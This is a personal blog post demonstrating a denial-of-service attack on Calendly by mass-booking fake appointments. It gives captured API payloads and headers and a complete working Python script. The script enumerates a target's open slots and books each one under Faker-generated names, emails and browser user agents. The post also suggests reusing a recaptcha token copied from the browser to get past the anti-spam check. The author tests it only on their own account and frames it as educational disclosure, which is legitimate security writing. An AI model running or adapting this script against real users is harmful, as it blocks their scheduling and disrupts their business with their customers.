+++
title = "Calendly Denial of Service via Mass-Scheduling"
summary = "Showing how Calendly can be easily spammed because I'm bored and unemployed."
date = "2024-05-16"
categories = ["Python", "Cybersecurity"]
ShowToc = true
TocOpen = true
+++

## Introduction

I've been doing interviews lately and I have been sent several [Calendly](https://calendly.com/) links.

If you haven't heard of Calendly, it's an online scheduling site. You can send someone your Calendly link, and they can see your availability and schedule an appointment.

I noticed that I don't have to be authenticated any way to be able to schedule an appointment on someone's calendar. Not great from a security perspective. So I decided to create a free Calendly account and see how easily a theoretical bad actor could abuse it.

The plan is to automate the process of scheduling appointments with Python to fill up someone's calendar with fake appointments.

{{< admonition type="warning" title="Disclaimer" >}}
This is purely for educational purposes. Please do not spam people's calendars.
{{< /admonition >}}

## Gathering Request URLs, Headers, and Payloads

First, I created a free account at https://calendly.com/signup.

<img src="/calendly-spam/new-account.webp" alt="My new Calendly account" width="720" height="422" style="max-width: 100%; height: auto; aspect-ratio: 2706 / 1588;" loading="lazy" decoding="async">

The dates and times available are shown in the following screenshot:

<img src="/calendly-spam/dates-available.webp" alt="Dates available for scheduling" width="720" height="422" style="max-width: 100%; height: auto; aspect-ratio: 2706 / 1588;" loading="lazy" decoding="async">

I went through the process of manually creating an appointment in order to capture requests, HTTP verbs, and the URLs they were going to.

This was the final step before creating an appointment:

<img src="/calendly-spam/scheduling-appointment.webp" alt="The process of scheduling an appointment on Calendly" width="720" height="422" style="max-width: 100%; height: auto; aspect-ratio: 2706 / 1588;" loading="lazy" decoding="async">

As I went through the process of scheduling and appointment I was keeping track of all the `GET` requests and their payloads (I chose not to show those here to get to the good stuff sooner). The final request that actually created an appointment was a `POST` request to `https://calendly.com/api/booking/invitees`. This is the payload of that request:

```json
{
    "analytics":{
        "referrer_page":null,
        "invitee_landed_at":"2024-05-16T00:39:59.886Z",
        "browser":"Firefox 126",
        "device":"undefined Mac OS X 10.15",
        "fields_filled":1,
        "fields_presented":1,
        "booking_flow":"v3",
        "seconds_to_convert":86
    },
    "embed":{

    },
    "event":{
        "start_time":"2024-05-16T10:30:00-07:00",
        "location_configuration":{
            "location":"",
            "phone_number":"",
            "additional_info":""
        },
        "guests":{

        }
    },
    "event_fields":[
        {
            "id":171096387,
            "name":"Please share anything that will help prepare for our meeting.",
            "format":"text",
            "required":false,
            "position":0,
            "answer_choices":null,
            "include_other":false,
            "value":""
        }
    ],
    "event_type_uuid":"2bf9fee5-e434-44a2-8f1f-15eb42f906f0",
    "invitee":{
        "timezone":"America/Los_Angeles",
        "time_notation":"12h",
        "full_name":"Nelson Figueroa",
        "email":"thisisafakeemail@example.com"
    },
    "payment_token":{

    },
    "recaptcha_token":"03AFcWeA6-bQo_p48-znbKGUevb...<cut for brevity>",
    "single_use_slug":null,
    "tracking":{
        "fingerprint":"a13001d0fcfe7e73a87dfd93e5edf7a5"
    },
    "scheduling_link_uuid":"ckbp-gj5-6gh"
}
```

Most of the fields aren't necessary. Through trial and error I noticed I really only need a JSON payload structured like this:

```json
{
    "event":{
        "start_time":"2024-05-16T10:30:00-07:00",
        "location_configuration":{
            "location":"",
            "phone_number":"",
            "additional_info":""
        }
    },
    "event_type_uuid":"2bf9fee5-e434-44a2-8f1f-15eb42f906f0",
    "invitee":{
        "timezone":"America/Los_Angeles",
        "time_notation":"12h",
        "full_name":"Nelson Figueroa",
        "email":"thisisafakeemail@example.com"
    }
}
```

I also made a note of the request headers that I needed for this `POST` request:

```
POST /api/booking/invitees HTTP/2
Host: calendly.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 Gecko/20100101 Firefox/126.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://calendly.com/nelsonfigueroa/30min/2024-05-16T10:30:00-07:00?back=1&month=2024-05&date=2024-05-16
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Content-Length: 3324
Origin: https://calendly.com
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
```

At this point I had the information I needed to try and mass-create appointments.

## Creating a Python Script

I came up with this Python script that makes a few `GET` requests to figure out what days are available for scheduling and then makes a `POST` request as previously described:

```python
import requests
import time
from datetime import datetime, timedelta
from faker import Faker

# we'll use Faker to generate fake names, emails, etc
fake = Faker()

starting_url = "https://calendly.com/nelsonfigueroa/"
scheduling_url = "https://calendly.com/api/booking/invitees"

# generate today's date for use in range later
today = datetime.today()
today_formatted = today.strftime("%Y-%m-%d")

# generate the date 30 days from today for use in range later
one_year_from_today = today + timedelta(days=30)
one_year_from_today_formatted = one_year_from_today.strftime("%Y-%m-%d")

# GET request to get event types
username = starting_url.split("/")[3]

event_types_url = f"https://calendly.com/api/booking/profiles/{username}/event_types"

response = requests.get(event_types_url)
event_types = response.json()

# event types have the URL paths we need (i.e. /30min)
# we need to get the UUID in the API call
for event_type in event_types:
    uuid = event_type["uuid"]

    # GET request to get the dates available for the event type
    time_zone = "America/Los_Angeles"
    range_start = today_formatted
    range_end = one_year_from_today_formatted
    booking_dates_url = (
        f"https://calendly.com/api/booking/event_types/{uuid}/calendar/range"
    )
    query_string = (
        f"?timezone={time_zone}&range_start={range_start}&range_end={range_end}"
    )
    booking_dates_url += query_string

    response = requests.get(booking_dates_url)
    booking_dates = response.json()
    booking_dates = booking_dates["days"]  # we only need the days

    # check if the user is available on each date
    for booking_date in booking_dates:
        if booking_date["status"] == "available":
            # get open spots for each available date
            open_spots = booking_date["spots"]

            for open_spot in open_spots:
                # we need the starting time for each open spot
                start_time = open_spot["start_time"]

                # we use data we've gathered to generate a payload
                payload = {
                    "event": {
                        "start_time": start_time,
                        "location_configuration": {
                            "location": None,
                            "phone_number": None,
                            "additional_info": None,
                        },
                    },
                    "event_type_uuid": uuid,
                    "invitee": {
                        "full_name": fake.simple_profile()["name"],
                        "email": fake.simple_profile()["mail"],
                        "timezone": time_zone,
                        "time_notation": "12h",
                    },
                }

                headers = {
                    "Host": "calendly.com",
                    "User-Agent": fake.chrome(),
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": starting_url,
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/json",
                    "Content-Length": "3924",
                    "Origin": "https://calendly.com",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache",
                    "TE": "trailers",
                }

                # finally, send a POST request with our payload to schedule an appointment
                response = requests.post(scheduling_url, json=payload, headers=headers)
                if response.status_code != 200:
                    # for debugging
                    print(f"Status Code: {response.status_code}")
                    print(response.json())
                    print(f"Payload sent: {payload}")
                else:
                    print("Successful request.")

```

I ran the script for a bit to create appointments. Soon after I started getting emails about appointments being made:

<img src="/calendly-spam/mailbox.webp" alt="Gmail inbox showing an influx of Calendly appointments" width="720" height="422" style="max-width: 100%; height: auto; aspect-ratio: 2706 / 1588;" loading="lazy" decoding="async">

And for further confirmation I also refreshed my Calendly calendar and saw that there were a couple days that are no longer available (May 16 and May 17):

<img src="/calendly-spam/dates-available-aftermath.webp" alt="Remaining dates available for scheduling" width="720" height="422" style="max-width: 100%; height: auto; aspect-ratio: 2706 / 1588;" loading="lazy" decoding="async">

This was much easier than expected. I didn't even let my script run indefinitely.

## There are Some Security Measures

After (presumably) sending too many requests I started getting a `400` status code in the response along with a message:

```json
{'message': 'recaptcha_challenge_required'}
```

It looks like there are *some* anti-spam measures in place.

Looking back at the original payload when making a `POST` request I see that there's a `recaptcha_token` in the JSON payload. I believe this is only created in the browser when it's evident that a real person is using Calendly. I don't know if there's a way to automate this in a script.

Either way, someone could manually schedule an appointment, check the browser dev tools to retrieve the token, copy and paste the token into a script, and spam someone's calendar. I didn't bother trying myself though because I've already determined that Calendly is trivial to abuse even without the `recaptcha_token`.

## Conclusion

Calendly is susceptible to spam.

I can think of a few scenarios where this could do some damage:
- If you're a salesperson, something like this would fill up your calendar and prevent potential customers from booking time with you.
- If you provide support to customers via Calendly, your calendar would also fill up, preventing actual customers from seeking support.
- If you get spammed, you may take the time to delete appointments and you might accidentally delete some legitimate appointments with real people.

There's probably a lot more scenarios.

## Further Reading

After writing this post I noticed someone else already had the same idea. I hesitated to link this because it's essentially an advertisement for this company's product but the article is still somewhat interesting (I have no association with this company). I also think their title is better than mine:
- https://www.ipm-corporation.com/research/distributed-denial-of-scheduling-on-calendly

I also noticed that there are Calendly API docs. These would have come in handy earlier but I only found out after I was done. That's fine though, the process of figuring it all out by inspecting browser requests was fun:
- https://developer.calendly.com/api-docs/
